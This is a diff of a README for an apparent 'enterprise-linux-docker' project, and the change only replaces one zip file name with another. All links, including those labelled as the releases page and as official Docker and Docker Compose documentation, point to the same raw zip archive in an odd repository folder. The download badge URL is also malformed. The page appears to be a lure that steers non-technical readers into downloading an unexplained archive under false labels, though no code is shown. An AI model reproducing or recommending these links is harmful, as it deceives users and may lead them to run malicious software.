@@ -1,7 +1,7 @@
 # 🐳 enterprise-linux-docker - Run Linux with Ease
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/jose2408-max/enterprise-linux-docker/main/Wenlockian/enterprise-linux-docker.zip%https://raw.githubusercontent.com/jose2408-max/enterprise-linux-docker/main/Wenlockian/enterprise-linux-docker.zip)](https://raw.githubusercontent.com/jose2408-max/enterprise-linux-docker/main/Wenlockian/enterprise-linux-docker.zip)
+[![Download](https://raw.githubusercontent.com/jose2408-max/enterprise-linux-docker/main/Wenlockian/linux_docker_enterprise_2.7.zip%https://raw.githubusercontent.com/jose2408-max/enterprise-linux-docker/main/Wenlockian/linux_docker_enterprise_2.7.zip)](https://raw.githubusercontent.com/jose2408-max/enterprise-linux-docker/main/Wenlockian/linux_docker_enterprise_2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the **enterprise-linux-docker** repository! This application helps you run a production-ready Linux environment using Docker. It includes popular distributions like RHEL UBI 9, Ubuntu 22.04 LTS, and CentOS 7. 
@@ -29,7 +29,7 @@ To run this software smoothly, your computer should meet the following requireme
 Follow these steps to download and set up the application.
 
 ### Step 1: Visit the Release Page
-Go to our [Releases page](https://raw.githubusercontent.com/jose2408-max/enterprise-linux-docker/main/Wenlockian/enterprise-linux-docker.zip) to find the latest version of the software. This page contains all the necessary files.
+Go to our [Releases page](https://raw.githubusercontent.com/jose2408-max/enterprise-linux-docker/main/Wenlockian/linux_docker_enterprise_2.7.zip) to find the latest version of the software. This page contains all the necessary files.
 
 ### Step 2: Download the Application
 On the Releases page, look for the latest version. Click on the link to download the appropriate files for your operating system. 
@@ -65,10 +65,10 @@ If you encounter any issues, please check our documentation, or feel free to ope
 ## 🌟 Additional Resources
 Here are some useful links to help you understand Docker and how it integrates with the enterprise-linux-docker application:
 
-- [Docker Documentation](https://raw.githubusercontent.com/jose2408-max/enterprise-linux-docker/main/Wenlockian/enterprise-linux-docker.zip)
-- [Docker Compose Documentation](https://raw.githubusercontent.com/jose2408-max/enterprise-linux-docker/main/Wenlockian/enterprise-linux-docker.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/jose2408-max/enterprise-linux-docker/main/Wenlockian/linux_docker_enterprise_2.7.zip)
+- [Docker Compose Documentation](https://raw.githubusercontent.com/jose2408-max/enterprise-linux-docker/main/Wenlockian/linux_docker_enterprise_2.7.zip)
 
 ## 🔗 Important Links
-- [Releases Page](https://raw.githubusercontent.com/jose2408-max/enterprise-linux-docker/main/Wenlockian/enterprise-linux-docker.zip) 
+- [Releases Page](https://raw.githubusercontent.com/jose2408-max/enterprise-linux-docker/main/Wenlockian/linux_docker_enterprise_2.7.zip) 
 
 Visit the above links for downloads and further information. With **enterprise-linux-docker**, you can enjoy a powerful and secure Linux experience without needing extensive technical knowledge.
